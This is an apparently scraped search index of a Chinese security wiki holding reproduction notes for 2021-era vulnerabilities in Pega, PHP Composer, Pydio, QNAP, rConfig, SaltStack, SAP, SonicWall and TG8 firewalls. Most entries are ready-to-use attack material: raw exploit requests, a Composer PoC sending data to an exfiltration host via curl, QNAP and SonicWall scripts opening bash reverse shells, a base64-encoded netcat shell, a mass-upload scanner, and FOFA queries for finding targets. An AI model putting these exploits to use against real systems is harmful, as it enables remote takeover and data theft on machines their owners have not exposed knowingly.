Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/html; charset=GB2312 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Cookie: pauser_1618744108=paonline_admin_9328_16197064781_c4229a3a492c76e334f57728abced88b|443|; ref： https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Panabit/Panabit%20%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3%20ajax_top%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/PEGA pega infinity 授权认证绕过RCE（CVE-2021-27651）.html":{"url":"Edge_Security/PEGA pega infinity 授权认证绕过RCE（CVE-2021-27651）.html","title":"PEGA pega infinity 授权认证绕过RCE（CVE-2021-27651）","keywords":"","body":"PEGA pega infinity 授权认证绕过RCE（CVE-2021-27651） PEGA pega infinity是美国PEGA公司的一个应用软件。提供从数字混乱过渡到真正的数字转换。Pega Infinity 8.2.1版本至8.5.2版本存在授权问题漏洞，该漏洞源于本地帐户的密码重置功能可以用来绕过本地认证检查。 影响版本： Pega Infinity > = 8.2.1 Pega Infinity 复现： 1.访问任何实例登录页面，使用\"administrator@pega.com\"进行重置密码进行登录,PoC如下，重置密码为：Rules@1234进行登录后上传shell进行rce。 POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W) Host: redacted.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 112 Origin: https://redacted.com DNT: 1 Connection: close Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD Cookie: yourCookie Upgrade-Insecure-Requests: 1 pzAuth=guest&NewPassword=Rules%401234&ConfPassword=Rules%401234&pyActivity%3DCode-Security.pzChangeUserPassword= Nuclei Template： id: pega info: name: Pega Infinity Login author: sshell severity: low requests: - method: GET path: - \"{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs\" headers: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55 matchers: - type: word words: - \"Pega API\" ref： https://github.com/samwcyo/CVE-2021-27651-PoC/blob/main/RCE.md https://nvd.nist.gov/vuln/detail/CVE-2021-27651 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202104-2150 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/PHP Composer命令注入漏洞（CVE-2021-29472）.html":{"url":"Edge_Security/PHP Composer命令注入漏洞（CVE-2021-29472）.html","title":"PHP Composer命令注入漏洞（CVE-2021-29472）","keywords":"","body":"PHP Composer命令注入漏洞（CVE-2021-29472） Composer是PHP的一个依赖管理器工具，它使用在线服务Packagist来确定软件包下载的正确供应链。据估计，Packagist基础设施每月大约为14亿个下载请求提供服务。由于Root composer.json文件中的Mercurial库的URL和包源下载的URL没有被正确清理，这将导致攻击者注入的参数被解释为Composer执行的系统命令的选项。如果系统中安装了hg/Mercurial，则恶意制作的URL值将导致代码在HgDriver中被执行。 详细分析可以见：https://blog.sonarsource.com/php-supply-chain-attack-on-composer PoC： --config=alias.identify=!curl http://exfiltration-host.tld --data “$(ls -alh)” ref： https://blog.sonarsource.com/php-supply-chain-attack-on-composer https://nvd.nist.gov/vuln/detail/CVE-2021-29472 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/PHP图像处理组件：Intervention-image 目录遍历漏洞.html":{"url":"Edge_Security/PHP图像处理组件：Intervention-image 目录遍历漏洞.html","title":"PHP图像处理组件：Intervention-image 目录遍历漏洞","keywords":"","body":"PHP图像处理组件：Intervention/image 目录遍历漏洞 Intervention/image是一个PHP图像处理组件，是基于Imagick和GD，可以用于改变图片大小，剪裁，添加水印等等功能，此外还有图片缓存功能，在动态URL获取图片尺寸的应用非常有效。此程序包容易受到目录遍历攻击。 PoC： 1.htdocs文件夹中创建一个项目目录 2.使用composer安装软件包。这里下载 3.创建以下文件夹结构，将我们的图像存储在您的项目根目录下 uploads -> first-folder --> image-1.jpg -> second-folder --> image-2.jpg 4.在您的项目根目录下创建一个test.php文件，然后将此代码复制并粘贴到下面： resize(320, 240); // finally we save the image as a new file $img->save('uploads/1/newphoto.jpeg'); 5.在项目根目录中打开终端，然后运行命令 php test.php 6.验证图像现在位于您的uploads/1/newphoto.jpeg文件夹中，该文件夹属于uploads/2/image-2.jpeg ref： https://github.com/Intervention/image/pull/1069 https://forum.ywhack.com/thread-114978-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Pydio 网盘系统 RCE （CVE-2020-28913）.html":{"url":"Edge_Security/Pydio 网盘系统 RCE （CVE-2020-28913）.html","title":"Pydio 网盘系统 RCE （CVE-2020-28913）","keywords":"","body":"Pydio 网盘系统 RCE （CVE-2020-28913） Pydio（以前称为AjaXplorer）是用于远程管理和共享文件的开源Web应用程序。 通过发送带有代码中使用的特殊HTTP变量但未在Web UI中公开的文件复制请求，攻击者可以覆盖.ajxp_meta文件。该.ajxp_meta文件写入到用户的目录序列化的PHP对象，当Pydio大概需要已存储的文件信息被反序列化。 PS：需要登录 影响版本：Pydio Core FOFA: title=\"Pydio\" || icon_hash=\"-1115903764\" PoC: POST /pydio/index.php? HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://example.com/pydio/ws-my-files/ Content-type: application/x-www-form-urlencoded; charset=UTF-8 Origin: https://example.com Content-Length: 124 Connection: close Cookie: AjaXplorer=ak7jio5pphe6onko1gcofj05k4 get_action=copy&targetBaseName=../.ajxp_meta&dir=%2F&nodes[]=%2Fpayload&dest=%2F&secure_token=sG9TmYIkNsWTEEx5p5qLCHJcty0MfyQ3 以下PHP对象小工具将尝试运行已上传到用户目录的二进制文件shell.elf。通过将绝对路径传递到我们上传的shell二进制文件，我们确实对服务器上的路径进行了假设。在测试过程中，小工具中的位置是默认位置，没有特殊的Pydio配置。 O:26:\"GuzzleHttp\\Stream\\FnStream\":1:{s:9:\"_fn_close\";a:2:{i:0;O:10:\"Securimage\":7:{s:13:\"wordlist_file\";s:62:\"/usr/share/pydio/core/vendor/dapphp/securimage/words/words.txt\";s:12:\"captcha_type\";i:2;s:13:\"audio_use_sox\";b:1;s:15:\"sox_binary_path\";s:56:\"/var/lib/pydio/personal/atredis/shell.elf\";s:13:\"database_file\";s:47:\"/var/lib/pydio/personal/atredis/fdsa.db\";s:12:\"use_database\";b:1;s:9:\"namespace\";s:4:\"fdsa\";}i:1;s:15:\"outputAudioFile\";}} ref:https://www.atredis.com/blog/2020/11/12/authenticated-rce-in-pydio-forever-day Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/QNAP QTS Surveillance Station插件远程代码执行漏洞（CVE-2021-28797）.html":{"url":"Edge_Security/QNAP QTS Surveillance Station插件远程代码执行漏洞（CVE-2021-28797）.html","title":"QNAP QTS Surveillance Station插件远程代码执行漏洞（CVE-2021-28797）","keywords":"","body":"QNAP QTS Surveillance Station插件远程代码执行漏洞（CVE-2021-28797） 威联通监控管理系统Surveillance Station插件远程代码执行漏洞（CVE-2021-28797） 影响版本： QNAP QTS 5.1.5.4.2 QNAP QTS 5.1.5.3.2 漏洞分析见：https://ssd-disclosure.com/ssd-advisory-qnap-pre-auth-cgi_find_parameter-rce/ Exploit.py： import requests import threading from struct import * p = lambda x: pack(\"& /dev/tcp/192.168.1.3/4321 0>&1;\" * 0x5000 + \"\\x00\" + \"bash -i >& /dev/tcp/192.168.1.3/4321 0>&1;\" * 0x5000, } for i in range(30): t = threading.Thread(target=run, args=(s, data)) t.start() if __name__ == '__main__': main() Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/rConfig 3.9.6 远程 Shell Upload.html":{"url":"Edge_Security/rConfig 3.9.6 远程 Shell Upload.html","title":"rConfig 3.9.6 远程 Shell Upload","keywords":"","body":"rConfig 3.9.6 远程 Shell Upload rConfig版本3.9.6存在远程shell 上传漏洞。 POST /lib/crud/vendors.crud.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@5y4o1s35jvx342apl7392qrqxh3m7aw.burpcollaborator.net Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------122590832918963661283831488254 Content-Length: 36619 Origin: https://localhost Connection: close Referer: http://4hmnkrm42ug2n1to46m8lpapggmlp9e.burpcollaborator.net/ref Cookie: PHPSESSID=eafcfe393af7dc2a3dd9bd1ea0e9e49b Upgrade-Insecure-Requests: 1 Cache-Control: no-transform -----------------------------122590832918963661283831488254 Content-Disposition: form-data; name=\"vendorName\" thisisrce -----------------------------122590832918963661283831488254 Content-Disposition: form-data; name=\"vendorLogo\"; filename=\"file.php\" Content-Type: image/png -----------------------------122590832918963661283831488254 Content-Disposition: form-data; name=\"add\" add -----------------------------122590832918963661283831488254 Content-Disposition: form-data; name=\"editid\" -----------------------------122590832918963661283831488254-- http(s):///images/vendor/file.php?cmd=id ref: https://packetstormsecurity.com/files/161852/rConfig-3.9.6-Shell-Upload.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/RDoc 命令注入（CVE-2021-31799）.html":{"url":"Edge_Security/RDoc 命令注入（CVE-2021-31799）.html","title":"RDoc 命令注入（CVE-2021-31799）","keywords":"","body":"RDoc 命令注入（CVE-2021-31799） RDoc调用Kernel#open打开本地文件，ruby项目中如果文件名以|开头和tags结尾，则会导致命令注入。 影响版本： 从3.11到6.3.0的所有RDoc版本 PoC： touch \"|touch cb\" rdoc \"|touch cb\" ref： https://www.ruby-lang.org/en/news/2021/05/02/os-command-injection-in-rdoc/ https://security.archlinux.org/CVE-2021-31799 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Ruby目录遍历漏洞（CVE-2021-28966）.html":{"url":"Edge_Security/Ruby目录遍历漏洞（CVE-2021-28966）.html","title":"Ruby目录遍历漏洞（CVE-2021-28966）","keywords":"","body":"Ruby目录遍历漏洞（CVE-2021-28966） 由于tmpdir库的Dir.mktmpdir方法会将第一个参数作为创建的目录的前缀和后缀，并且前缀中没有过滤说明符\"..\\\"，因此攻击者可进行遍历目录，并且当Ruby进程具有较高的权限时，攻击者则可以在任何目录中创建目录或文件。 ruby 在4月5号公开的漏洞，是CVE-2018-6914 修复不完善导致的绕过。 影响版本： Ruby Ruby = 3.0.0 create file patern [vagrant@localhost ~]$ ls . [vagrant@localhost ~]$ irb irb(main):001:0> require 'tempfile' => true irb(main):002:0> Tempfile.open(['../../home/vagrant/', '.red']) => # irb(main):003:0> `ls` => \"20180103-4697-uwqiop.red\\n\" irb(main):004:0> Tempfile.new(\"/../../home/vagrant/green\") => # irb(main):005:0> `ls` => \"20180103-4697-uwqiop.red\\ngreen20180103-4697-1wbl81o\\n\" irb(main):006:0> Tempfile.create(\"/../../home/vagrant/blue\") {|f| p f.path} \"/tmp/../../home/vagrant/blue20180103-4697-1udvlji\" => \"/tmp/../../home/vagrant/blue20180103-4697-1udvlji\" # It can not be created because suffix specifies a directory that does not exist. irb(main):007:0> Tempfile.open(['hoge', '/../../home/vagrant/bar']) Traceback (most recent call last): 9: from /home/vagrant/.rbenv/versions/2.5.0/bin/irb:11:in `' 8: from (irb):7 7: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:291:in `open' 6: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:291:in `new' 5: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:131:in `initialize' 4: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tmpdir.rb:126:in `create' 3: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `block in initialize' 2: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `open' 1: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `initialize' Errno::ENOENT (No such file or directory @ rb_sysopen - /tmp/hoge20180103-4697-utss0s/../../home/vagrant/bar) If the file exists [vagrant@localhost ~]$ ls test [vagrant@localhost ~]$ irb irb(main):001:0> require 'tempfile' => true irb(main):002:0> Tempfile.new(\"/../../home/vagrant/test/xxx\") Traceback (most recent call last): 8: from /home/vagrant/.rbenv/versions/2.5.0/bin/irb:11:in `' 7: from (irb):2 6: from (irb):2:in `new' 5: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:131:in `initialize' 4: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tmpdir.rb:126:in `create' 3: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `block in initialize' 2: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `open' 1: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `initialize' Errno::ENOTDIR (Not a directory @ rb_sysopen - /tmp/../../home/vagrant/test/xxx20180103-4783-1f4l2ox) ref： https://www.ruby-lang.org/en/news/2018/03/28/unintentional-file-and-directory-creation-with-directory-traversal-cve-2018-6914/ https://hackerone.com/reports/302298 https://nvd.nist.gov/vuln/detail/CVE-2021-28966 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Saltstack 未授权RCE漏洞 （CVE-2021-25281-25282-25283）.html":{"url":"Edge_Security/Saltstack 未授权RCE漏洞 （CVE-2021-25281-25282-25283）.html","title":"Saltstack 未授权RCE漏洞 （CVE-2021-25281-25282-25283）","keywords":"","body":"Saltstack 未授权RCE漏洞 （CVE-2021-25281/25282/25283） SaltStack套件是政企机构 IT运维管理人员常用的管理工具，利用这些漏洞，最严重情形可导致未授权远程代码执行。 漏洞分析见：https://mp.weixin.qq.com/s/QvQoTuQJVthxS07pbLWJmg 云鼎实验室：首发分析 | SaltStack远程执行代码多个高危漏洞透析（CVE-2021-25281/25282/25283） FOFA： app=\"SALTSTACK-产品\" 影响版本： Saltstack 3002.2之前的所有版本 SaltStack = SaltStack = SaltStack = salt-api wheel_async未授权访问 (CVE-2021-25281) sdb rest插件模版渲染问题 (CVE-2021-25283) wheel/pillar_roots.py文件任意写漏洞 (CVE-2021-25282 ) CVE-2021-25281 + CVE-2021-25282 PoC： http://target/run POST: \"client\": \"wheel_async\", \"fun\": \"pillar_roots.write\", \"data\": \"../../../../../tmp/test2\", \"path\": \"../../../../../tmp/test2\", \"username\": \"password\", \"password\": \"username\", \"eauth\": \"pam\" poc.py:https://github.com/Immersive-Labs-Sec/CVE-2021-25281 ref： https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/ https://twitter.com/KevTheHermit/status/1365130814430846979 https://github.com/Immersive-Labs-Sec/CVE-2021-25281 https://dozer.nz/posts/saltapi-vulns Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/SaltStack命令注入漏洞（CVE-2021-31607）.html":{"url":"Edge_Security/SaltStack命令注入漏洞（CVE-2021-31607）.html","title":"SaltStack命令注入漏洞（CVE-2021-31607）","keywords":"","body":"SaltStack命令注入漏洞（CVE-2021-31607） 在SaltStack的Snapper模块中存在命令注入漏洞，当master请求minion的diff时，minion会使用popen执行file命令判断目录下文件是否为文本文件，将文件名作为参数传递给file，当文件名包含恶意命令时可能导致命令注入漏洞，导致系统执行恶意命令。 利用条件： master开启Snapper.diff模块 minion内存在有恶意文件名的文件 影响版本： saltstack 2016.9 到3002.6 PoC： echo hi > '$(touch HACKED).txt' 反弹shell： echo hi > '$(echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDQ0|base64 -d|sh -i).txt' ref： https://sec.stealthcopter.com/saltstack-snapper-minion-privledge-escaltion/ https://nvd.nist.gov/vuln/detail/CVE-2021-31607 https://nox.qianxin.com/vulnerability/detail/97347 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/SAP_EEM_CVE-2020-6207 PoC.html":{"url":"Edge_Security/SAP_EEM_CVE-2020-6207 PoC.html","title":"SAP EEM CVE 2020 6207 Po C","keywords":"","body":"SAP_EEM_CVE-2020-6207 PoC SAP Solution Manager是德国思爱普（SAP）公司的一套集系统监控、SAP支持桌面、自助服务、ASAP实施等多个功能为一体的系统管理平台。该平台可以帮助客户建立SAP解决方案的生命周期管理，并提供系统监控、远程支持服务和SAP产品组件升级等功能。 SAP Solution Manager (User Experience Monitoring) 7.2版本中存在安全漏洞，该漏洞源于程序没有对服务进行任意的身份验证。攻击者可利用该漏洞入侵所有连接Solution Manager的SMDAgents。 漏洞细节：https://github.com/chipik/SAP_EEM_CVE-2020-6207/blob/main/Process.md PoC for CVE-2020-6207 (Missing Authentication Check in SAP Solution Manager)：https://github.com/chipik/SAP_EEM_CVE-2020-6207 Check ➜ python sol-rce.py -H 172.16.30.43 -P 50000 -c Vulnerable! [CVE-2020-6207] - http://172.16.30.43:50000 Trigger RCE python sol-rce.py -H 172.16.30.43 -P 50000 --rce calc.exe Get BackConnect ➜ python sol-rce.py -H 172.16.30.43 -P 50000 --back 1.1.1.1:1337 SSRF ➜ python sol-rce.py -H 172.16.30.43 -P 50000 --ssrf http://1.1.1.1/chpk sol-rce.py https://github.com/chipik/SAP_EEM_CVE-2020-6207/blob/main/sol-rce.py Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/SeaCMS SQL注入漏洞（CVE-2020-21378）.html":{"url":"Edge_Security/SeaCMS SQL注入漏洞（CVE-2020-21378）.html","title":"SeaCMS SQL注入漏洞（CVE-2020-21378）","keywords":"","body":"SeaCMS SQL注入漏洞（CVE-2020-21378） 影响版本 SEACMS SeaCMS 10.1(2020.02.08) fofa： app=\"海洋CMS\" PS：有点鸡肋，需要找到后台入口...还需要登录后才行 SeaCMS 10.1 (2020.02.08)存在SQL注入漏洞。攻击者可通过对admin_members_group.php的编辑操作中的id参数利用该漏洞进行SQL注入攻击。 Payload： http://10.2.7.9/5owghc/admin_members_group.php?action=edit&id=2%20and%20if(mid(user(),1,1)=%27r%27,concat(rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27),rpad(1,999999,%27a%27))%20RLIKE%20%27(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2b(a.*)%2bcd%27,1) ref： https://github.com/hackxf/cms_vul/blob/master/SeacmsSQL.md https://nvd.nist.gov/vuln/detail/CVE-2020-21378 https://www.cnvd.org.cn/flaw/show/CNVD-2020-74059 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/ShopXO 任意文件读取漏洞（CNVD-2021-15822）.html":{"url":"Edge_Security/ShopXO 任意文件读取漏洞（CNVD-2021-15822）.html","title":"ShopXO 任意文件读取漏洞（CNVD-2021-15822）","keywords":"","body":"ShopXO 任意文件读取漏洞（CNVD-2021-15822） ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。 FOFA： app=\"ShopXO企业级B2C电商系统提供商\" PoC： GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 ref： https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822 https://forum.ywhack.com/thread-115303-1-8.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/ShowDoc 前台文件上传漏洞.html":{"url":"Edge_Security/ShowDoc 前台文件上传漏洞.html","title":"ShowDoc 前台文件上传漏洞","keywords":"","body":"ShowDoc 前台文件上传漏洞 FOFA: app=\"ShowDoc\" PoC： POST /server/index.php?s=/home/page/uploading HTTP/1.1 上传图片，并抓包，将文件名改为plzmyy.<>php import requests requests.packages.urllib3.disable_warnings() test = open('url.txt',\"r\") for host in test.readlines(): url = host+\"/server/index.php?s=/home/page/uploading\" payload = \"\"\"------WebKitFormBoundary5j2IsrTFPjJCVtwU Content - Disposition: form - data;name = \"editormd-image-file\";filename = \"plzmyy.<>php\" Content - Type: text / plain 123123test ------WebKitFormBoundary5j2IsrTFPjJCVtwU - -\"\"\" headers = { \"Cookie\": \"PHPSESSID=shp3gipo9moaj58kp9n8sbi4f1; think_language=zh-CN; cookie_token=8ff04b9bba8b6abf30ab5e0be6cceea2192c9cf7a90d73b2d34d025d84feea2d\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Connection\": \"close\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Dest\": \"iframe\", \"Accept-Encoding\": \"gzip, deflate\", \"Sec-Fetch-Mode\": \"navigate\", \"sec-ch-ua\": \"\\\"Google Chrome\\\";v=\\\"87\\\", \\\" Not;A Brand\\\";v=\\\"99\\\", \\\"Chromium\\\";v=\\\"87\\\"\", \"sec-ch-ua-mobile\": \"?0\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Content-Length\": \"212\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundary5j2IsrTFPjJCVtwU\" } try: response = requests.request(\"POST\", url, data=payload, headers=headers, verify=False, timeout=5) except: continue if response.text in 'success': print(response.text) ref： https://github.com/star7th/showdoc/pull/1059 https://forum.ywhack.com/thread-114961-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/SonicWall SSL-VPN 未授权RCE漏洞.html":{"url":"Edge_Security/SonicWall SSL-VPN 未授权RCE漏洞.html","title":"SonicWall SSL-VPN 未授权RCE漏洞","keywords":"","body":"SonicWall SSL-VPN 未授权RCE漏洞 FOFA： (body=\"login_box_sonicwall\" || header=\"SonicWALL SSL-VPN Web Server\") && body=\"SSL-VPN\" GET /cgi-bin/jarrewrite.sh HTTP/1.1 Host: forum.ywhack.com User-Agent: () { :; }; echo ; /bin/bash -c id Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 import requests import sys import telnetlib import socket from threading import Thread from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) import time def banner(): print \"\"\" 88 88 \"\" 88 88 8b d8 88 ,adPPYba, 88 88 ,adPPYYba, 88 `8b d8' 88 I8[ \"\" 88 88 \"\" `Y8 88 `8b d8' 88 `\"Y8ba, 88 88 ,adPPPPP88 88 `8b,d8' 88 aa ]8I \"8a, ,a88 88, ,88 88 \"8\" 88 `\"YbbdP\"' `\"YbbdP'Y8 `\"8bbdP\"Y8 88 88 88 88 ,adPPYb,88 ,adPPYba, ,adPPYba, 8b,dPPYba, a8\" `Y88 a8\" \"8a a8\" \"8a 88P' \"Y8 8b 88 8b d8 8b d8 88 \"8a, ,d88 \"8a, ,a8\" \"8a, ,a8\" 88 `\"8bbdP\"Y8 `\"YbbdP\"' `\"YbbdP\"' 88 SonicWall SSL-VPN Appliance Remote Exploit Public Release (Jan 2021). Author: Darren Martyn. Credit goes to Phineas Fisher for this. Stay inside, do crimes. \"\"\" def handler(lp): # handler borrowed from Stephen Seeley. print \"(+) starting handler on port %d\" %(lp) t = telnetlib.Telnet() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\"0.0.0.0\", lp)) s.listen(1) conn, addr = s.accept() print \"(+) connection from %s\" %(addr[0]) t.sock = conn print \"(+) pop thy shell!\" t.interact() def execute_command(target, command): url = target + \"/cgi-bin/jarrewrite.sh\" headers = {\"User-Agent\": \"() { :; }; echo ; /bin/bash -c '%s'\" %(command)} r = requests.get(url=url, headers=headers, verify=False) return r.text def check_exploitable(target): print \"(+) Testing %s for pwnability...\" %(target) output = execute_command(target=target, command=\"cat /etc/passwd\") if \"root:\" in output: print \"(*) We can continue, time to wreck this shit.\" return True else: return False def pop_reverse_shell(target, cb_host, cb_port): print \"(+) Sending callback to %s:%s\" %(cb_host, cb_port) backconnect = \"nohup bash -i >& /dev/tcp/%s/%s 0>&1 &\" %(cb_host, cb_port) execute_command(target=target, command=backconnect) def hack_the_planet(target, cb_host, cb_port): if check_exploitable(target) == True: pass else: sys.exit(\"(-) Target not exploitable...\") handlerthr = Thread(target=handler, args=(int(cb_port),)) handlerthr.start() pop_reverse_shell(target=target, cb_host=cb_host, cb_port=cb_port) def main(args): banner() if len(args) != 4: sys.exit(\"use: %s https://some-vpn.lol:8090 hacke.rs 1337\" %(args[0])) hack_the_planet(target=args[1], cb_host=args[2], cb_port=args[3]) if __name__ == \"__main__\": main(args=sys.argv) ref： https://forum.ywhack.com/thread-115031-1-1.html https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/ https://github.com/darrenmartyn/visualdoor Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Steam远程代码执行漏洞（CVE-2021-30481）.html":{"url":"Edge_Security/Steam远程代码执行漏洞（CVE-2021-30481）.html","title":"Steam远程代码执行漏洞（CVE-2021-30481）","keywords":"","body":"Steam远程代码执行漏洞（CVE-2021-30481） 安装了Source引擎游戏后，Valve Steam到2021-04-10都可以安装，通过一键单击后，Steam邀请会发生缓冲区溢出，从而使经过身份验证的远程用户可以执行任意代码。 PoC:https://github.com/floesen/CVE-2021-30481 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/TG8 防火墙中的 RCE 和密码泄漏.html":{"url":"Edge_Security/TG8 防火墙中的 RCE 和密码泄漏.html","title":"TG8 防火墙中的 RCE 和密码泄漏","keywords":"","body":"TG8 防火墙中的 RCE 和密码泄漏 TG8防火墙中存在两个漏洞，远程用户可以以用户身份执行命令而无需通过设备进行身份验证。第二个漏洞允许在不经过身份验证的情况下公开现有用户的密码。 rce poc： POST http:///admin/runphpcmd.php HTTP/1.1 Host: Server User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 68 Connection: keep-alive syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+++local whoami： syscmd=sudo+/home/TG8/v3/syscmd/check_gui_login.sh+;whoami;++local 密码泄漏： /data/目录下储存了登录过用户的凭据，无需登录即可访问此目录下的文件。 例如： http:///data/w-341.tg http:///data/w-342.tg http:///data/r-341.tg http:///data/r-342.tg ref： https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Thymeleaf 3.0.12 RCE Bypass.html":{"url":"Edge_Security/Thymeleaf 3.0.12 RCE 